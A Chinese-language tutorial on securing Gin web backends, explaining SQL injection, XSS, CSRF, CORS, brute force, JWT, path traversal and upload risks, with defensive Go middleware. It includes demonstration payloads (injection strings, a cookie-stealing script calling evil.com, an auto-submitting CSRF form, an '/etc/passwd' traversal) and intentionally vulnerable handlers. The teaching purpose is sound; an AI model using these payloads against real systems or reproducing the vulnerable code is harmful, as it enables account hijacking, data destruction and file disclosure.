# Gin 框架进阶系列（八）：Web 安全攻防——原理、攻击与防御实践

---

## 为什么后端开发必须懂安全

很多开发者觉得安全是运维或专门安全团队的事，自己只管实现功能。这种想法极其危险。一个 SQL 注入就能拖走整张用户表，一个 XSS 就能劫持管理员 Session，一个不设防的文件上传就能让攻击者拿到服务器 Shell。功能写得再漂亮，安全出一个漏洞，全盘皆输。

这篇文章覆盖 Web 后端最常见的攻击面，大部分内容在官方文档 [***Gin 安全最佳实践***](https://gin-gonic.com/zh-cn/docs/middleware/security-guide/)中已经有简单说明，我基于此做了一些解读和补充。每一种我都按三段讲：原理是什么、攻击怎么发生、在 Gin 里怎么防，我。

> 参考 Gin 安全最佳实践[https://gin-gonic.com/zh-cn/docs/middleware/security-guide](https://gin-gonic.com/zh-cn/docs/middleware/security-guide/)

---

## 一、SQL 注入

### 原理

SQL 注入的本质是**用户输入被当作 SQL 代码执行**。当程序把用户输入直接拼进 SQL 字符串时，攻击者可以构造恶意输入改变 SQL 的语义。

### 攻击演示

假设有一段登录逻辑用字符串拼接 SQL：

```go
// 极度危险：永远不要这样写
func Login(c *gin.Context) {
    email := c.PostForm("email")
    password := c.PostForm("password")

    query := "SELECT * FROM users WHERE email = '" + email + "' AND password = '" + password + "'"
    db.Raw(query).Scan(&user)
}
```

攻击者在 email 字段输入 `' OR 1=1 --`，拼出来的 SQL 变成：

```sql
SELECT * FROM users WHERE email = '' OR 1=1 --' AND password = ''
```

`OR 1=1` 永远为真，`--` 注释掉后面的内容。攻击者无需密码就能拿到第一条用户记录，通常是管理员。

更狠的输入如 `'; DROP TABLE users; --` 可以直接删表。

### 防御

**第一道防线：参数化查询（预编译语句）。** 这是最根本的解决方案。GORM 默认就使用参数化查询：

```go
// 安全：GORM 自动使用参数化查询
db.Where("email = ?", email).First(&user)

// 底层生成的是：SELECT * FROM users WHERE email = $1
// email 的值作为参数传递，不参与 SQL 解析
```

参数化查询的原理是把 SQL 结构和数据分开发送给数据库。数据库先编译 SQL 结构，再把参数值填进去。不管用户输入什么，它永远是"数据"，不可能变成"代码"。

**第二道防线：对 Raw SQL 的严格管控。** 如果必须写原生 SQL，绝对使用占位符：

```go
// 安全
db.Raw("SELECT * FROM users WHERE email = ? AND status = ?", email, status).Scan(&user)

// 危险：永远不要拼接
db.Raw("SELECT * FROM users WHERE email = '" + email + "'").Scan(&user)
```

**第三道防线：最小权限原则。** 数据库连接使用的账号不应该有 DROP、ALTER 这些权限。即使注入成功了，也删不了表。

```go
// 数据库连接用的账号应该只有增删改查权限
// 建表、删表、改结构这些操作用另一个高权限账号手动执行
// 绝不在应用配置里放 root 账号
```

**第四道防线：输入校验。** 邮箱字段就校验邮箱格式，ID 字段就校验是否为正整数，从入口就堵住非法字符：

```go
type LoginReq struct {
    Email    string `json:"email" binding:"required,email"`
    Password string `json:"password" binding:"required,min=6,max=64"`
}
```

---

## 二、XSS（跨站脚本攻击）

### 原理

XSS 的本质是**攻击者的恶意脚本被注入到网页中，在其他用户的浏览器上执行**。攻击者不是在攻击服务器，而是借服务器之手攻击其他用户。

XSS 分三种。存储型 XSS 是把恶意脚本存进数据库，每个访问页面的用户都会中招，危害最大。反射型 XSS 是把恶意脚本放在 URL 参数里，诱导用户点击。DOM 型 XSS 是前端 JavaScript 直接把不安全的数据插入 DOM。

### 攻击演示

假设有一个评论功能，用户发了一条"评论"：

```
<script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>
```

如果后端原样存进数据库、前端原样渲染到页面，那么每个看到这条评论的用户，浏览器都会执行这段脚本，把他们的 Cookie 发到攻击者的服务器。攻击者拿到 Cookie 就能冒充这些用户。

### 防御

**第一道防线：输出转义。** 后端返回数据时对 HTML 特殊字符转义。Go 的 `html/template` 包自带转义，如果你用 Gin 渲染模板，它默认就是安全的。但如果是 API 返回 JSON 给前端渲染，转义的责任在前端——不过后端可以主动做一层：

```go
// pkg/security/xss.go
package security

import (
    "html"
    "regexp"
)

var scriptPattern = regexp.MustCompile(`(?i)<script[^>]*>[\s\S]*?</script>`)

// SanitizeString 清理用户输入中的潜在 XSS 内容
func SanitizeString(s string) string {
    // 移除 <script> 标签
    s = scriptPattern.ReplaceAllString(s, "")
    // 转义 HTML 特殊字符
    s = html.EscapeString(s)
    return s
}
```

也可以引入专业的 HTML 清理库 `bluemonday` 做白名单过滤，只允许安全的 HTML 标签通过。

**第二道防线：写一个 XSS 过滤中间件，对所有输入统一处理。**

```go
// middleware/xss.go
package middleware

import (
    "html"

    "github.com/gin-gonic/gin"
)

func XSSFilter() gin.HandlerFunc {
    return func(c *gin.Context) {
        // 对 URL query 参数转义
        queryParams := c.Request.URL.Query()
        for key, values := range queryParams {
            for i, v := range values {
                queryParams[key][i] = html.EscapeString(v)
            }
        }
        c.Request.URL.RawQuery = queryParams.Encode()

        c.Next()
    }
}
```

这个中间件只处理了 query 参数。对于 JSON body，更实际的做法是在业务层存储前做清理，因为 body 的结构千变万化，中间件里统一处理反而不灵活。

**第三道防线：HTTP 安全头。** 这一条在后面"安全响应头"部分详细讲。

**第四道防线：Cookie 设置 HttpOnly。** 加了 HttpOnly 的 Cookie，JavaScript 读不到。就算 XSS 成功注入了脚本，也偷不走 Cookie：

```go
c.SetCookie("session_id", token, 3600, "/", "", true, true)
//                                              Secure  HttpOnly
// Secure=true: 只在 HTTPS 下发送
// HttpOnly=true: JavaScript 无法读取
```

---

## 三、CSRF（跨站请求伪造）

### 原理

CSRF 的本质是**攻击者借用用户的身份（Cookie）发起用户不知情的请求**。用户登录了 A 网站，浏览器里存着 A 的 Cookie。用户接着访问了恶意网站 B，B 的页面里有一个自动提交的表单指向 A 的"转账"接口。浏览器发请求时会自动带上 A 的 Cookie，A 的服务器以为是用户自己操作的。

### 攻击演示

攻击者在自己的网站放了这样一段 HTML：

```html
<!-- 恶意网站上的隐藏表单 -->
<form action="https://bank.com/api/transfer" method="POST" style="display:none">
    <input name="to" value="attacker_account" />
    <input name="amount" value="10000" />
</form>
<script>document.forms[0].submit();</script>
```

用户只要打开这个页面，浏览器就会带着 bank.com 的 Cookie 自动提交转账请求。

### 防御

**对于使用 JWT + JSON API 的项目（大多数前后端分离项目），CSRF 的威胁大大降低。** 原因是：JWT 通常放在 `Authorization` 请求头里而不是 Cookie 里，跨站请求不会自动带上这个头。恶意网站用表单或图片发起的请求无法设置自定义请求头。

但如果你的项目用了 Cookie 来存 Token，就必须防 CSRF：

```go
// middleware/csrf.go
package middleware

import (
    "crypto/rand"
    "encoding/hex"
    "net/http"

    "your-project/pkg/response"

    "github.com/gin-gonic/gin"
)

func generateToken() string {
    bytes := make([]byte, 32)
    rand.Read(bytes)
    return hex.EncodeToString(bytes)
}

func CSRF() gin.HandlerFunc {
    return func(c *gin.Context) {
        // GET 请求：生成 CSRF Token 写入 Cookie
        if c.Request.Method == http.MethodGet {
            token := generateToken()
            c.SetCookie("csrf_token", token, 3600, "/", "", true, false)
            // HttpOnly 设为 false，前端 JS 需要读取它
            c.Next()
            return
        }

        // 非 GET 请求：校验 CSRF Token
        cookieToken, err := c.Cookie("csrf_token")
        if err != nil {
            response.Fail(c, 403, 10008, "CSRF Token 缺失")
            c.Abort()
            return
        }

        headerToken := c.GetHeader("X-CSRF-Token")
        if headerToken == "" || headerToken != cookieToken {
            response.Fail(c, 403, 10009, "CSRF Token 无效")
            c.Abort()
            return
        }

        c.Next()
    }
}
```

原理是"双重提交 Cookie"模式：服务器在 Cookie 里放一个随机 Token，前端从 Cookie 读出来放到请求头里。因为跨域的恶意网站读不到目标网站的 Cookie 值，所以它无法在请求头里放正确的 Token。

**另一个有效措施是 SameSite Cookie 属性：**

```go
// Go 1.16+ net/http 支持 SameSite
http.SetCookie(c.Writer, &http.Cookie{
    Name:     "session_id",
    Value:    token,
    Path:     "/",
    HttpOnly: true,
    Secure:   true,
    SameSite: http.SameSiteStrictMode, // 跨站请求完全不带此 Cookie
})
```

`SameSite=Strict` 意味着从任何外部网站发起的请求都不会带这个 Cookie，CSRF 直接失效。`SameSite=Lax` 稍宽松一些，允许顶级导航（比如点击链接跳转）时带 Cookie，但表单提交和 AJAX 不带。

---

## 四、CORS 配置不当

### 原理

CORS（跨源资源共享）本身是浏览器的安全机制，限制前端 JavaScript 跨域请求。但如果服务器的 CORS 配置过于宽松，就等于拆掉了这道防线。

### 攻击场景

最常见的错误是把 `Access-Control-Allow-Origin` 设为 `*` 同时又允许带凭证（Cookie），或者动态把请求头中的 Origin 原样返回。攻击者的网站就能自由地调用你的 API，用户的 Cookie 也会一起发过去。

### 防御

```go
// middleware/cors.go
package middleware

import (
    "net/http"

    "github.com/gin-gonic/gin"
)

func CORS() gin.HandlerFunc {
    // 白名单
    allowedOrigins := map[string]bool{
        "https://www.yoursite.com": true,
        "https://admin.yoursite.com": true,
    }

    return func(c *gin.Context) {
        origin := c.GetHeader("Origin")

        if allowedOrigins[origin] {
            c.Header("Access-Control-Allow-Origin", origin)
            c.Header("Access-Control-Allow-Credentials", "true")
            c.Header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS")
            c.Header("Access-Control-Allow-Headers", "Content-Type, Authorization, X-CSRF-Token, X-Request-ID")
            c.Header("Access-Control-Max-Age", "86400")
        }

        // 预检请求直接返回
        if c.Request.Method == http.MethodOptions {
            c.AbortWithStatus(http.StatusNoContent)
            return
        }

        c.Next()
    }
}
```

核心原则有三条。第一，用白名单而不是通配符。第二，不在白名单内的 Origin 就不返回 CORS 头，浏览器会自动拦截。第三，`Access-Control-Max-Age` 设长一些减少预检请求，但 `Allow-Origin` 绝不能为了方便写 `*`。

开发环境可以用一个环境变量控制是否放开 `localhost`：

```go
if os.Getenv("ENV") == "development" {
    allowedOrigins["http://localhost:3000"] = true
    allowedOrigins["http://localhost:5173"] = true
}
```

---

## 五、暴力破解与限流

### 原理

暴力破解不需要什么高深技术——攻击者就是拿着密码字典对登录接口一个一个试。如果没有任何限制，每秒可以试几百上千个密码。

### 防御

**第一层：全局请求限流。** 限制单个 IP 的总请求速率：

```go
// middleware/rate_limit.go
package middleware

import (
    "net/http"
    "sync"
    "time"

    "your-project/pkg/response"

    "github.com/gin-gonic/gin"
)

type visitor struct {
    tokens    float64
    lastVisit time.Time
}

type RateLimiter struct {
    mu       sync.Mutex
    visitors map[string]*visitor
    rate     float64 // 每秒补充的令牌数
    burst    float64 // 桶容量
}

func NewRateLimiter(rate float64, burst float64) *RateLimiter {
    rl := &RateLimiter{
        visitors: make(map[string]*visitor),
        rate:     rate,
        burst:    burst,
    }
    // 定期清理过期记录，防止内存膨胀
    go rl.cleanup()
    return rl
}

func (rl *RateLimiter) cleanup() {
    for {
        time.Sleep(5 * time.Minute)
        rl.mu.Lock()
        for ip, v := range rl.visitors {
            if time.Since(v.lastVisit) > 10*time.Minute {
                delete(rl.visitors, ip)
            }
        }
        rl.mu.Unlock()
    }
}

func (rl *RateLimiter) allow(ip string) bool {
    rl.mu.Lock()
    defer rl.mu.Unlock()

    v, exists := rl.visitors[ip]
    now := time.Now()

    if !exists {
        rl.visitors[ip] = &visitor{tokens: rl.burst - 1, lastVisit: now}
        return true
    }

    // 按时间补充令牌
    elapsed := now.Sub(v.lastVisit).Seconds()
    v.tokens += elapsed * rl.rate
    if v.tokens > rl.burst {
        v.tokens = rl.burst
    }
    v.lastVisit = now

    if v.tokens < 1 {
        return false
    }
    v.tokens--
    return true
}

func RateLimit(rate float64, burst float64) gin.HandlerFunc {
    limiter := NewRateLimiter(rate, burst)

    return func(c *gin.Context) {
        ip := c.ClientIP()
        if !limiter.allow(ip) {
            response.Fail(c, http.StatusTooManyRequests, 10006, "请求过于频繁，请稍后再试")
            c.Abort()
            return
        }
        c.Next()
    }
}
```

这是一个令牌桶算法的简单实现。`rate` 是每秒补充的令牌数，`burst` 是桶容量（允许的突发量）。每次请求消耗一个令牌，令牌用完就拒绝。

生产环境如果有多个实例，应该用 Redis 来做分布式限流，原理类似，只是计数器存在 Redis 里。

**第二层：登录接口的针对性保护。** 全局限流防的是 DDoS，登录接口还需要更严格的策略：

```go
// middleware/login_limiter.go
package middleware

import (
    "fmt"
    "sync"
    "time"

    "your-project/pkg/errcode"

    "github.com/gin-gonic/gin"
)

type loginAttempt struct {
    count     int
    lockUntil time.Time
}

type LoginLimiter struct {
    mu       sync.Mutex
    attempts map[string]*loginAttempt
}

func NewLoginLimiter() *LoginLimiter {
    return &LoginLimiter{
        attempts: make(map[string]*loginAttempt),
    }
}

func (ll *LoginLimiter) Check(key string) error {
    ll.mu.Lock()
    defer ll.mu.Unlock()

    a, exists := ll.attempts[key]
    if !exists {
        return nil
    }

    if time.Now().Before(a.lockUntil) {
        remaining := time.Until(a.lockUntil).Minutes()
        return fmt.Errorf("账号已锁定，请 %.0f 分钟后再试", remaining+1)
    }

    // 锁定期过了，重置
    if time.Now().After(a.lockUntil) && a.count >= 5 {
        a.count = 0
    }

    return nil
}

func (ll *LoginLimiter) RecordFail(key string) {
    ll.mu.Lock()
    defer ll.mu.Unlock()

    a, exists := ll.attempts[key]
    if !exists {
        a = &loginAttempt{}
        ll.attempts[key] = a
    }

    a.count++
    if a.count >= 5 {
        a.lockUntil = time.Now().Add(15 * time.Minute) // 连续失败 5 次，锁 15 分钟
    }
}

func (ll *LoginLimiter) Reset(key string) {
    ll.mu.Lock()
    defer ll.mu.Unlock()
    delete(ll.attempts, key)
}
```

在登录 handler 中使用：

```go
var loginLimiter = NewLoginLimiter()

func Login(c *gin.Context) {
    var req LoginReq
    if err := c.ShouldBindJSON(&req); err != nil {
        response.HandleValidationError(c, err)
        return
    }

    // 同时按 IP 和邮箱限制，双保险
    key := c.ClientIP() + ":" + req.Email
    if err := loginLimiter.Check(key); err != nil {
        c.Error(errcode.ErrTooManyRequest)
        return
    }

    user, err := userService.Authenticate(req.Email, req.Password)
    if err != nil {
        loginLimiter.RecordFail(key)
        c.Error(errcode.ErrPasswordWrong)
        return
    }

    loginLimiter.Reset(key)
    // ... 签发 Token
}
```

用 `IP + 邮箱` 作为限流的 key，而不是单独用 IP 或单独用邮箱。只用 IP 的话，公司内网几百人共享一个出口 IP 会被误伤；只用邮箱的话，攻击者换 IP 就绕过了。

---

## 六、密码存储

### 原理

数据库被拖库是迟早的事——不是"会不会"而是"什么时候"。所以密码绝不能明文存储，也不能用 MD5 或 SHA256 这些通用哈希。通用哈希太快了，一张高端显卡每秒能算几十亿次 MD5，加上彩虹表，破解起来轻而易举。

### 正确做法：bcrypt

```go
// pkg/security/password.go
package security

import "golang.org/x/crypto/bcrypt"

// HashPassword 对密码进行 bcrypt 加密
func HashPassword(password string) (string, error) {
    // cost=12 表示 2^12 = 4096 轮迭代
    bytes, err := bcrypt.GenerateFromPassword([]byte(password), 12)
    return string(bytes), err
}

// CheckPassword 校验密码
func CheckPassword(password, hash string) bool {
    err := bcrypt.CompareHashAndPassword([]byte(hash), []byte(password))
    return err == nil
}
```

bcrypt 之所以适合密码存储，有三个原因。第一，它故意很慢，cost=12 时单次哈希大约需要 250 毫秒，暴力破解的成本指数级上升。第二，它自带盐值（salt），同样的密码每次哈希出来的结果都不同，彩虹表没用。第三，它可以通过调 cost 参数来适应硬件升级——硬件快了就把 cost 调高。

还有一个容易忽略的点——限制密码最大长度。bcrypt 有 72 字节的输入上限，超长的密码要么被截断要么报错，所以上面 binding 里设了 `max=64`。

---

## 七、JWT 安全

### 常见漏洞

JWT 本身的设计是安全的，但使用不当会引入严重漏洞。

**漏洞一：不验证签名算法。** 有些 JWT 库允许 Token 自己声明用 `none` 算法（即不签名）。攻击者把头部的 `alg` 改成 `none`，删掉签名部分，服务器如果不检查就直接接受了。

**漏洞二：密钥太弱。** 用 `secret`、`123456`、`your-secret-key` 这种密钥，攻击者拿到一个合法 Token 后可以离线爆破出密钥。

**漏洞三：Token 永不过期。** 一旦泄露就永远有效。

**漏洞四：敏感信息放在 Payload 里。** JWT 的 Payload 只是 Base64 编码，不是加密。任何人都能解码看到内容。

### 防御

```go
// pkg/security/jwt.go
package security

import (
    "errors"
    "time"

    "github.com/golang-jwt/jwt/v5"
)

// 密钥至少 32 字节，从环境变量读取
var jwtSecret = []byte(os.Getenv("JWT_SECRET"))

type Claims struct {
    UserID uint   `json:"user_id"`
    Role   string `json:"role"`
    jwt.RegisteredClaims
}

func GenerateToken(userID uint, role string) (string, error) {
    claims := Claims{
        UserID: userID,
        Role:   role,
        RegisteredClaims: jwt.RegisteredClaims{
            Issuer:    "your-app",
            ExpiresAt: jwt.NewNumericDate(time.Now().Add(2 * time.Hour)),
            IssuedAt:  jwt.NewNumericDate(time.Now()),
            NotBefore: jwt.NewNumericDate(time.Now()),
        },
    }

    token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
    return token.SignedString(jwtSecret)
}

func ParseToken(tokenStr string) (*Claims, error) {
    token, err := jwt.ParseWithClaims(tokenStr, &Claims{},
        func(token *jwt.Token) (interface{}, error) {
            // 关键：强制检查签名算法，防止 none 攻击
            if _, ok := token.Method.(*jwt.SigningMethodHMAC); !ok {
                return nil, errors.New("unexpected signing method")
            }
            return jwtSecret, nil
        },
    )
    if err != nil {
        return nil, err
    }

    claims, ok := token.Claims.(*Claims)
    if !ok || !token.Valid {
        return nil, errors.New("invalid token")
    }
    return claims, nil
}
```

这段代码做了几件关键的事。`ParseWithClaims` 的回调函数里显式检查了签名算法必须是 HMAC，堵住了 `alg: none` 攻击。`ExpiresAt` 设了 2 小时过期，不给永久 Token。Payload 里只放了 `user_id` 和 `role`，不放邮箱、手机号等敏感信息。

关于 JWT 密钥，生产环境应该用 `openssl rand -hex 32` 生成一个随机的 64 字符密钥，通过环境变量注入，绝不写在代码里。

### Token 刷新机制

短期 Access Token + 长期 Refresh Token 是目前最主流的做法：

```go
// Access Token: 有效期短（如 2 小时），用于访问 API
// Refresh Token: 有效期长（如 7 天），仅用于换取新的 Access Token

func GenerateTokenPair(userID uint, role string) (accessToken, refreshToken string, err error) {
    accessToken, err = generateAccessToken(userID, role)   // 2 小时
    if err != nil {
        return
    }
    refreshToken, err = generateRefreshToken(userID)        // 7 天
    return
}
```

Refresh Token 应该存在数据库或 Redis 里，这样用户修改密码或管理员封禁账号时可以主动让 Refresh Token 失效。Access Token 因为有效期短，不需要存储，让它自然过期即可。

---

## 八、敏感信息泄露

### 常见泄露途径

第一种，API 返回了过多字段。查用户信息时把密码哈希、内部 ID、创建时间等不需要的字段全返回了。第二种，错误信息暴露内部细节——数据库表名、SQL 语句、文件路径。第三种，日志里记录了密码明文或完整的 Token。

### 防御

**用专门的 DTO 控制输出字段：**

```go
// 数据库模型，所有字段
type User struct {
    ID        uint   `gorm:"primaryKey"`
    Email     string
    Password  string
    Phone     string
    Role      string
    CreatedAt time.Time
    UpdatedAt time.Time
}

// API 响应用的 DTO，只暴露该暴露的
type UserResponse struct {
    ID    uint   `json:"id"`
    Email string `json:"email"`
    Role  string `json:"role"`
}

func ToUserResponse(u *User) UserResponse {
    return UserResponse{
        ID:    u.ID,
        Email: u.Email,
        Role:  u.Role,
    }
}
```

永远不要直接把数据库模型作为 JSON 返回。就算用 `json:"-"` 标签隐藏了密码字段，以后加新字段时一不小心就会泄露。用独立的 DTO 是最安全的。

**日志脱敏：**

```go
// 记录登录日志时
log.Printf("login attempt: email=%s ip=%s", maskEmail(email), c.ClientIP())

func maskEmail(email string) string {
    parts := strings.Split(email, "@")
    if len(parts) != 2 || len(parts[0]) <= 2 {
        return "***"
    }
    return parts[0][:2] + "***@" + parts[1]
    // zhangsan@gmail.com -> zh***@gmail.com
}
```

---

## 九、路径遍历与文件上传安全

### 攻击

如果服务器根据用户输入的文件名读取文件：

```go
// 极度危险
func Download(c *gin.Context) {
    filename := c.Query("file")
    c.File("./uploads/" + filename)
}
```

攻击者请求 `?file=../../etc/passwd`，就能读到服务器的系统文件。

### 防御

```go
func Download(c *gin.Context) {
    filename := c.Query("file")

    // 只取文件名，去掉任何路径部分
    filename = filepath.Base(filename)

    // 检查是否包含路径分隔符（双重保险）
    if strings.Contains(filename, "..") {
        c.Error(errcode.ErrBadRequest)
        return
    }

    fullPath := filepath.Join("./uploads", filename)

    // 确认最终路径确实在 uploads 目录下
    absPath, _ := filepath.Abs(fullPath)
    absUploads, _ := filepath.Abs("./uploads")
    if !strings.HasPrefix(absPath, absUploads) {
        c.Error(errcode.ErrForbidden)
        return
    }

    c.File(fullPath)
}
```

`filepath.Base` 提取纯文件名（`../../etc/passwd` 变成 `passwd`），然后用绝对路径前缀匹配再确认一次。两层防护，确保无论输入什么都出不了 uploads 目录。

**文件上传安全的检查清单：**

```go
func Upload(c *gin.Context) {
    file, header, err := c.Request.FormFile("file")
    if err != nil {
        c.Error(errcode.ErrBadRequest)
        return
    }
    defer file.Close()

    // 1. 限制文件大小（在路由层也要配置）
    if header.Size > 5*1024*1024 { // 5MB
        c.Error(errcode.New(400, 10010, "文件大小不能超过 5MB"))
        return
    }

    // 2. 检查文件真实类型（读文件头，不信任扩展名）
    buf := make([]byte, 512)
    file.Read(buf)
    contentType := http.DetectContentType(buf)
    file.Seek(0, 0) // 重置读取位置

    allowedTypes := map[string]bool{
        "image/jpeg": true,
        "image/png":  true,
        "image/gif":  true,
    }
    if !allowedTypes[contentType] {
        c.Error(errcode.New(400, 10011, "不支持的文件类型"))
        return
    }

    // 3. 生成随机文件名，不使用用户原始文件名
    ext := filepath.Ext(header.Filename)
    newFilename := uuid.New().String() + ext
    dst := filepath.Join("./uploads", newFilename)

    // 4. 保存
    out, _ := os.Create(dst)
    defer out.Close()
    io.Copy(out, file)

    response.Success(c, gin.H{"filename": newFilename})
}
```

用 `http.DetectContentType` 读文件头来判断类型，而不是看扩展名。攻击者可以把 `.exe` 重命名为 `.jpg`，但文件头骗不了。用随机文件名，防止攻击者预测上传后的文件路径。

---

## 十、安全响应头

一组正确配置的 HTTP 安全头能防御大量攻击，这是最低成本的安全加固手段：

```go
// middleware/secure_headers.go
package middleware

import "github.com/gin-gonic/gin"

func SecureHeaders() gin.HandlerFunc {
    return func(c *gin.Context) {
        // 防止浏览器猜测内容类型（阻止某些 XSS 攻击）
        c.Header("X-Content-Type-Options", "nosniff")

        // 防止页面被嵌入 iframe（阻止点击劫持）
        c.Header("X-Frame-Options", "DENY")

        // 启用浏览器内置的 XSS 过滤器（旧浏览器适用）
        c.Header("X-XSS-Protection", "1; mode=block")

        // 控制 Referrer 信息泄露
        c.Header("Referrer-Policy", "strict-origin-when-cross-origin")

        // 内容安全策略：只允许加载自身域的资源
        c.Header("Content-Security-Policy", "default-src 'self'")

        // 强制 HTTPS（设置后浏览器在有效期内只用 HTTPS 访问）
        c.Header("Strict-Transport-Security", "max-age=63072000; includeSubDomains")

        // 限制浏览器功能（禁止访问摄像头、麦克风、地理位置等）
        c.Header("Permissions-Policy", "camera=(), microphone=(), geolocation=()")

        c.Next()
    }
}
```

> 参考：https://gin-gonic.com/zh-cn/docs/middleware/security-headers/

逐一解释下关键的几个。`X-Content-Type-Options: nosniff` 防止浏览器把 JSON 响应当 HTML 解析——有些旧浏览器会这样做，攻击者可以利用这一点触发 XSS。`X-Frame-Options: DENY` 禁止你的页面被任何网站用 iframe 嵌入，直接杜绝点击劫持。`Content-Security-Policy` 是最强大的安全头，它能精确控制页面允许加载哪些资源，是 XSS 的终极防线。`Strict-Transport-Security` 告诉浏览器"我这个域名永远只用 HTTPS"，一旦设置，即使用户输入 `http://` 浏览器也会自动转成 `https://`。

---

## 十一、完整的安全中间件注册

```go
func main() {
    r := gin.New()

    // 限制请求体大小，防止超大 body 攻击
    r.MaxMultipartMemory = 8 << 20 // 8MB

    r.Use(middleware.RequestID())
    r.Use(middleware.CustomRecovery())
    r.Use(gin.Logger())
    r.Use(middleware.SecureHeaders())
    r.Use(middleware.CORS())
    r.Use(middleware.RateLimit(10, 20)) // 每秒 10 个请求，突发 20
    r.Use(middleware.ErrorHandler())

    // 公开路由
    public := r.Group("/api")
    {
        public.POST("/login", handler.Login)
        public.POST("/register", handler.Register)
    }

    // 需要认证的路由
    auth := r.Group("/api")
    auth.Use(middleware.JWTAuth())
    {
        auth.GET("/profile", handler.GetProfile)
        auth.POST("/upload", handler.Upload)
    }

    // 管理员路由
    admin := r.Group("/api/admin")
    admin.Use(middleware.JWTAuth(), middleware.RequireRole("admin"))
    {
        admin.GET("/users", handler.ListUsers)
    }

    r.Run(":8080")
}
```

---

## 安全检查清单

把本文涉及的防御措施汇总成一份检查清单，做代码审查或上线前过一遍：

**输入层面。** 所有 SQL 操作使用参数化查询，不拼字符串。所有用户输入经过 binding 校验。文件上传检查文件头而非扩展名。文件名使用随机生成，不用用户原始名。路径操作使用 `filepath.Base` 并校验前缀。

**认证层面。** 密码使用 bcrypt（cost ≥ 12）存储。JWT 签名算法在解析时强制验证。Token 设合理过期时间，支持刷新和主动失效。登录接口有频率限制和账号锁定。

**输出层面。** 统一响应结构，错误信息不暴露内部细节。用 DTO 控制返回字段，不直接返回数据库模型。日志中的敏感字段做脱敏处理。

**传输层面。** 生产环境全站 HTTPS。Cookie 设置 Secure、HttpOnly、SameSite。CORS 白名单配置，不用通配符。安全响应头全部开启。

**架构层面。** 数据库连接使用最小权限账号。密钥从环境变量读取，不硬编码。全局请求限流 + 敏感接口限流。Panic Recovery 使用自定义实现，输出统一格式。

安全不是一次性的事。依赖库要定期更新，`go list -m -u all` 可以检查过期依赖。关注 Go 官方的安全公告。用 `govulncheck` 扫描已知漏洞。

---